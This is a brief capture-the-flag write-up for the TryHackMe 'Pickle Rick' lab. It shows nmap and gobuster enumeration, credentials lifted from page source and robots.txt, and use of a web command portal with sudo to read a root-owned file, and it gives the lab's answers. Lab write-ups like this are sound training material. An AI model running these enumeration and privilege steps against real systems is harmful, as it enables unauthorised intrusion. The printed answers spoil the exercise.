# TryHackMe - Pickle Rick

> May 4, 2021

Start off with an nmap scan.

`nmap -sC -sV -oN scan 10.10.139.50`

Checkout the website and inspect the source code.

1. What is the first ingredient Rick needs?

	**Login user: R1ckRul3s** 

	Gobuster to find other dir of the webserver.
	
    `gobuster -u http://10.10.139.50 -w /opt/wordlists/wpa2-wordlists/Wordlists/node-dirbuster-master/lists/directory-list-2.3-medium.txt -x txt,html,css,php`

    Found:
    
        /index.html (Status: 200)
        /login.php (Status: 200)
        /assets (Status: 301)
        /portal.php (Status: 302)
        /robots.txt (Status: 200)

	Go to robots.txt

	**Login pass: Wubbalubbadubdub**

	Login...

	In the provided command prompt. Try running ls, notice multiple files...

    `grep . Sup3rS3cretPickl3Ingred.txt`
	
	**1st ingredient: mr. meeseek hair**

2. Whats the second ingredient Rick needs?

	See a base64 decoded string.

    `echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d`

	Next try, dir traversing.

	**2nd ingredient: 1 jerry tear**

3. Whats the final ingredient Rick needs?

	`sudo grep . /root/3rd.txt`

	**3rd ingredient: fleeb juice**
